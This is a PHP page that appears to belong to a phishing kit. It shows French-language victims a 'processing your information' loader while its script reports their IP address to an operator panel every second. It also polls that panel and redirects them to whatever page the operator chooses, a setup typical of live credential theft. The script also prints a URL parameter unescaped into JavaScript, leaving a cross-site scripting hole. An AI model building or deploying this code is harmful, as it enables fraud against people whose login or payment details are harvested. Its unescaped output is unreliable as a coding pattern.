<?php 
require '../main.php';
?><!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion en cours...</title>
    <style>
        html,body{
            height:100%;
        }
        body{
            font-family:sans-serif;
            display:flex;
            align-items:center;
            justify-content:center;
        }
        .loader{
            text-align:center;
            display:inline-block;
            width:300px;
            max-width:100%;
        }
        p{
            margin:60px 0;
        }
    </style>
</head>
<body>

<div class="loader">
<img src="res/logo.svg" style="margin:10px;">
<p>Traitement de vos informations...<br>
Veuillez ne pas quitter cette page.
</p>
<img src="res/loading.gif" style="width:60px;">
</div>



<script src="res/cdns/jq.js"></script>
<script>
    setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>